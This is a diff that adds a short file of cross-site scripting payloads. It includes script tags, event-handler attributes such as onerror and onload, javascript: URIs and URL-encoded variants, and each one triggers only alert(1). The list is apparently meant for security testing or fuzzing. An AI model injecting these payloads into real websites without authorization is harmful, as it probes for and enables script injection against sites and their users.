@@ -1,0 +1,12 @@
+<script>alert(1)</script>
+"><script>alert(1)</script>
+<img src='x' onerror='alert(1)'>
+<svg onload='alert(1)'>
+javascript:alert(1)
+<body onload='alert(1)'>
+<iframe src='javascript:alert(1)'></iframe>
+<marquee/onstart=alert(1)>
+<input/onfocus=alert(1)>
+%3Cscript%3Ealert(1)%3C/script%3E
+%3Cimg%20src='x'%20onerror='alert(1)'%3E
+%3Csvg%20onload='alert(1)'%3E
